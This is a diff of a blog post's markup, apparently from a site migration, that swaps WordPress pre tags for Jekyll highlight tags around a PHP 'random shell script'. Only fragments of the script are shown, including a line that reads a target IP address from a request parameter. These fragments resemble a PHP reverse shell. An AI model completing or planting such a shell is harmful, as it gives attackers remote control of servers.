@@ -14,7 +14,7 @@ A random shell script.. I don&#8217;t know what this one does, or find any infor
 
 ### Random Shell Script Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = $_GET["ip"]; 
@@ -145,5 +145,5 @@ function printit ($string) {
         print "$string\n";
     }
 }
-?&gt;
-</pre>
+?>
+{% endhighlight %}
